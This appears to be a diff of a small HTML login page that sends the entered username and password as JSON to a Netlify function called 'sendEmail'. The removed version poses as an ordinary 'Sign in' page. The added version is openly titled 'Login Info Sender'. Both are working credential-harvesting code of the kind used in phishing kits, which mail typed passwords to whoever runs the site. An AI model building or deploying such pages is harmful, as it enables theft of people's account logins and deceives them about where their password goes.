@@ -3,40 +3,81 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sign in</title>
+<title>Login Info Sender</title>
 <style>
-* { box-sizing: border-box; font-family: Arial, sans-serif; }
-body { margin:0; height:100vh; display:flex; justify-content:center; align-items:center; background: linear-gradient(to bottom, #e6f0fa, #cfe2f3);}
-.login-container {width:360px; background:#fff; padding:35px; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,0.2);}
-input {width:100%; padding:12px; margin:10px 0 15px 0; border:1px solid #ccc; border-radius:6px; font-size:14px;}
-button {width:100%; padding:12px; background:#117aca; color:white; border:none; border-radius:6px; font-weight:bold; cursor:pointer;}
-button:hover {background:#0d5f9c;}
+body {
+font-family: Arial, sans-serif;
+background-color: #f0f8ff; /* light blue background */
+display: flex;
+justify-content: center;
+align-items: center;
+height: 100vh;
+}
+form {
+background: #fff;
+padding: 2rem;
+border-radius: 8px;
+box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+display: flex;
+flex-direction: column;
+width: 300px;
+}
+input {
+margin-bottom: 1rem;
+padding: 0.5rem;
+font-size: 1rem;
+}
+button {
+padding: 0.5rem;
+font-size: 1rem;
+cursor: pointer;
+background-color: #0077cc;
+color: white;
+border: none;
+border-radius: 4px;
+}
+#message {
+margin-top: 1rem;
+font-weight: bold;
+text-align: center;
+color: green;
+}
 </style>
 </head>
 <body>
-<div class="login-container">
-<h2>Sign in</h2>
-<input type="text" id="username" placeholder="Username">
-<input type="password" id="password" placeholder="Password">
-<button onclick="submitForm()">Sign In</button>
-</div>
+
+<form id="loginForm">
+<input type="text" name="username" placeholder="Username" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Send Login Info</button>
+</form>
+<div id="message"></div>
 
 <script>
-function submitForm(){
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+e.preventDefault(); // prevent page reload
+
 const formData = {
-username: document.getElementById("username").value,
-password: document.getElementById("password").value
+username: e.target.username.value,
+password: e.target.password.value
 };
 
-fetch("/.netlify/functions/sendEmail", {
-method: "POST",
-headers: {"Content-Type":"application/json"},
+try {
+const res = await fetch('/.netlify/functions/sendEmail', {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify(formData)
-})
-.then(res=>res.json())
-.then(data=>alert(data.message))
-.catch(err=>console.error(err));
+});
+
+const data = await res.json();
+document.getElementById('message').innerText = data.message;
+} catch (err) {
+console.error(err);
+document.getElementById('message').innerText = 'Error sending email';
+document.getElementById('message').style.color = 'red';
 }
+});
 </script>
+
 </body>
 </html>
